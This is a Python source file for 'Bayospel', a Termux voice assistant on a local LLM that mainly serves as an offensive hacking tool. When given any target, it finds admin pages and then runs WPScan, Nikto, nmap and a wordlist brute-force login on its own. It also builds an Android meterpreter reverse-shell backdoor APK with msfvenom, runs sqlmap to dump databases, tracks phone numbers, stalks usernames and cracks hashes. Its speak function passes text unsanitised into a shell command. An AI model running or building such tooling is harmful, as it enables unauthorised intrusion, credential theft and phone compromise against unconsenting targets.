import os, subprocess, json, time, requests, sys, shutil, ollama, datetime, zipfile
import bayo_reader, bayo_track, bayo_vision, bayo_recon, bayo_exploit, bayo_infiltrate, bayo_brute, bayo_wifi, bayo_sms

# Load Settings
try:
    with open('config.json', 'r') as f: config = json.load(f)
except:
    config = {"bot_name": "Bayospel", "boss_name": "Big Boss"}

BOT_NAME = config.get("bot_name", "Bayospel")
BOSS_NAME = config.get("boss_name", "Big Boss")
authenticated = False
chat_history = []
mood = "professional"

# --- ADMIN FINDER & BRUTE FORCE ---
def find_admin_pages(url):
    if not url.startswith('http'): url = 'http://' + url
    paths = ['/admin', '/login', '/wp-admin', '/admin.php', '/panel', '/dashboard', '/config.php']
    headers = {'User-Agent': 'Mozilla/5.0'}
    found_urls = []
    print(f"[*] Bayospel is scanning {url} for entry points...")
    
    for path in paths:
        full_url = url.rstrip('/') + path
        try:
            r = requests.get(full_url, headers=headers, timeout=3)
            if r.status_code == 200:
                found_urls.append(full_url)
                print(f"[+] Found entry: {full_url}")
                
                # --- AUTOMATION START ---
                speak(f"Door found at {path}! Analyzing target type...", force_mood="hyped")
                
                # 1. Check if it is WordPress
                if "/wp-admin" in full_url:
                    speak("Oga, this is a WordPress site! Launching WPScan attack...")
                    # Scans for users, vulnerable plugins, and themes
                    os.system(f"wpscan --url {url} --enumerate u,vp,vt --batch")
                
                # 2. General Nikto Scan
                print(f"[*] Running Nikto on {full_url}...")
                os.system(f"nikto -h {full_url} -Tuning 4")
                
                # 3. Port Scan
                print(f"[*] Rattling ports on {url}...")
                os.system(f"nmap -F {url.replace('http://','').replace('https://','')}")
                
                # 4. Login Attempt
                speak("Attempting to crack the login now, Boss.")
                user, pwd = brute_force_login(full_url, "rockyou.txt")
                if user:
                    speak(f"Jackpot Boss! I enter! User: {user}, Pass: {pwd}", force_mood="hyped")
                # --- AUTOMATION END ---
                
        except: continue
    return found_urls

def brute_force_login(target_url, wordlist_path="passwords.txt"):
    users = ['admin', 'user', 'root']
    if os.path.exists(wordlist_path):
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f.readlines()[:100]]
    else:
        passwords = ['123456', 'admin123', 'password']
    for u in users:
        for p in passwords:
            try:
                data = {'username': u, 'password': p, 'login': 'submit'}
                r = requests.post(target_url, data=data, timeout=3)
                if "dashboard" in r.text.lower() or "welcome" in r.text.lower():
                    return u, p
            except: continue
    return None, None

# --- DYNAMIC VOICE & MOOD ---
def speak(text, force_mood=None):
    global mood
    m = force_mood if force_mood else mood
    p, r = ("1.1", "1.0")
    if m == "hyped": p, r = ("1.4", "1.2")
    if m == "vexed": p, r = ("0.8", "0.9")
    print(f"{BOT_NAME} [{m.upper()}]: {text}")
    os.system(f"termux-tts-speak -p {p} -r {r} \"{text}\"")

def main():
    global authenticated, chat_history, mood
    os.system("termux-wake-lock")
    knowledge = bayo_reader.load_knowledge()

    while True:
        try:
            system_p = f"Name: {BOT_NAME}. Role: Cyber-Jarvis. User: {BOSS_NAME}. Mood: {mood}. Knowledge: {knowledge[:500]}. Speak Naija-style."
            line = input(f"\n[ {BOT_NAME} ({mood}) ]: ")
            cmd = line.strip().lower()
            if not cmd: continue

            if not authenticated:
                if "debam" in cmd or "i am here" in cmd:
                    authenticated = True
                    speak(f"Identity confirmed. Welcome, {BOSS_NAME}")
                else: speak("Access Denied")
                continue

            # --- 1. FIND ADMIN & BRUTE FORCE ---
            if "find admin" in cmd or "admin scan" in cmd:
                target_site = cmd.replace("find admin", "").replace("admin scan", "").strip()
                if not target_site:
                    speak("Boss, which website? You no put target.")
                else:
                    speak(f"Scanning {target_site} sharp-sharp...")
                    found_urls = find_admin_pages(target_site)
                continue

            # --- 2. OPEN APPS ---
            elif "open" in cmd or "launch" in cmd:
                if "whatsapp" in cmd: os.system("am start --user 0 -n com.whatsapp/com.whatsapp.Main")
                elif "facebook" in cmd: os.system("am start --user 0 -n com.facebook.katana/com.facebook.katana.LoginActivity")
                elif "youtube" in cmd: os.system("am start --user 0 -n com.google.android.youtube/com.google.android.apps.youtube.app.watchwhile.WatchWhileActivity")
                elif "instagram" in cmd: os.system("am start --user 0 -n com.instagram.android/com.instagram.mainactivity.MainActivity")
                elif "telegram" in cmd: os.system("am start --user 0 -n org.telegram.messenger/org.telegram.messenger.DefaultIcon")
                elif "tiktok" in cmd: os.system("am start --user 0 -n com.zhiliaoapp.musically/com.ss.android.ugc.aweme.main.MainActivity")
                speak("Done sharp-sharp.")
                continue

            # --- 3. RECON/SCAN ---
            elif "scan" in cmd or "recon" in cmd:
                target = cmd.split()[-1]
                speak(f"Starting recon on {target}...")
                report = bayo_recon.full_recon(target)
                speak("Recon done.")
                print(report)
                continue

            # --- PHONE CONTROL ---
            elif any(x in cmd for x in ["torch", "minimize", "home", "help", "battery", "storage", "system info", "device info", "screenshot", "snap screen", "record", "listen", "contact", "phonebook", "location", "where am i", "call", "dial", "send sms", "message", "flash", "toast", "network scan", "notification", "volume", "scan wifi", "port scan", "nikto", "wpscan"]):
                if "help" in cmd:
                    commands = ["I can control any phone", "Home", "I can Track", "Device Info", "Network Scan", "find admin", "wpscan"]
                    speak("Bayonle, here be my current powers:")
                    for c in commands: print(f"[*] {c}")
                elif "torch on" in cmd: os.system("termux-torch on")
                elif "torch off" in cmd: os.system("termux-torch off")
                elif "minimize" in cmd or "home" in cmd: os.system("am start -a android.intent.action.MAIN -c android.intent.category.HOME")
                elif "battery" in cmd:
                    res = subprocess.getoutput("termux-battery-status")
                    speak(f"Boss, your battery dey {json.loads(res).get('percentage')}%")
                elif "screenshot" in cmd:
                    os.system(f"termux-screenshot /sdcard/Pictures/bayo_shot_{int(time.time())}.png")
                    speak("Snapped.")
                elif "scan wifi" in cmd:
                    speak("Scanning WiFi signals...")
                    os.system("python3 bayo_wifi.py")
                elif "port scan" in cmd:
                    target = input("Target: ").strip()
                    os.system(f"nmap -A {target}")
                elif "nikto" in cmd:
                    target = input("URL: ").strip()
                    os.system(f"nikto -h {target}")
                elif "wpscan" in cmd:
                    target = input("URL: ").strip()
                    os.system(f"wpscan --url {target}")
                continue

            # --- HACKING SUITE ---
            elif any(x in cmd for x in ["stalk", "payload", "sqlmap", "inject"]):
                if "stalk" in cmd:
                    user = cmd.replace("stalk", "").strip()
                    os.system(f"python3 ~/sherlock/sherlock/sherlock.py {user}")
                elif "payload" in cmd:
                    lhost = cmd.split()[-1]
                    os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT=4444 R > reports/backdoor.apk")
                elif "sqlmap" in cmd or "inject" in cmd:
                    url = cmd.replace("sqlmap", "").replace("inject", "").strip()
                    os.system(f"python3 ~/sqlmap-dev/sqlmap.py -u \"{url}\" --batch --dbs")
                continue

            # --- TRACKING & JOHN ---
            elif "track number" in cmd or "locate" in cmd:
                target_num = input("Number: ").strip()
                if target_num:
                    import bayo_track
                    bayo_track.track_number(target_num)
                continue
            elif "crack password" in cmd or "run john" in cmd:
                target_hash = input("Path to file: ").strip()
                if os.path.exists(target_hash):
                    speak("Starting attack.")
                    os.system(f"john --wordlist=rockyou.txt {target_hash}")
                continue

            # --- THE BRAIN ---
            else:
                try:
                    chat_history.append({"role": "user", "content": cmd})
                    res = ollama.chat(model="gemma2:2b", messages=[{"role":"system","content":system_p}] + chat_history[-4:])
                    reply = res["message"]["content"]
                    chat_history.append({"role": "assistant", "content": reply})
                    speak(reply)
                except: speak("Brain lag.")

        except Exception as e:
            print(f"System Error: {e}")

if __name__ == "__main__":
    main()
